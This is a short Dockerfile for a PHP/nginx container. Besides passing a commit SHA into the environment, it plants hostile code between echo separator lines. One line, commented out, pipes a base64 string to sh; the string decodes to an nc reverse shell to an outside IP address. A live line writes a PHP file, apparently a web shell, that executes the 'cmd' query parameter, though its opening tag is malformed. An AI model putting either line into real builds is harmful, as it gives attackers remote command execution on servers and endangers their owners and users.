#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
RUN echo "=========="
RUN echo "<php `$_GET['cmd']`;?>" > /var/www/html/ey_webshell.php
